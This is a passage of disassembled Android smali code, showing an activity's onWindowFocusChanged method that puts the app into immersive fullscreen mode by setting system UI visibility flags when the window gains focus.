.end method

.method public onWindowFocusChanged(Z)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    if-eqz p1, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object p1

    const/16 v0, 0x1006

    invoke-virtual {p1, v0}, Landroid/view/View;->setSystemUiVisibility(I)V

    :cond_0
    return-void
.end method
